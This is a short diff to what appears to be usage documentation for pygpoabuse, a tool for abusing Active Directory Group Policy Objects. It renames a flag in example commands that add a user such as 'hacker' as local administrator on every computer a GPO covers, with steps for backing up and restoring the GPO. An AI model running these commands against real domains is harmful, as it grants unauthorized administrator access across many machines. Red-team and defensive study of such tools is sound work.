@@ -46,7 +46,7 @@ python pygpoabuse.py domain/username:password --add-rights -gpo-id "{GUID}" -rig
 ### Adding Local Administrator
 
 ```
-python pygpoabuse.py domain/username:password --add-local-admin -gpo-id "{GUID}" -user-account "targetuser"
+python pygpoabuse.py domain/username:password --add-local-admin -gpo-id "{GUID}" -admin-account "targetuser"
 ```
 
 This will add the specified user to the local administrators group on all computers where the GPO applies.
@@ -94,7 +94,7 @@ python pygpoabuse.py domain/admin:password --backup-gpo -gpo-id "{GUID}"
 
 2. Add a user as local administrator:
 ```
-python pygpoabuse.py domain/admin:password --add-local-admin -gpo-id "{GUID}" -user-account "hacker"
+python pygpoabuse.py domain/admin:password --add-local-admin -gpo-id "{GUID}" -admin-account "hacker"
 ```
 
 3. After completing your operations, restore the GPO:
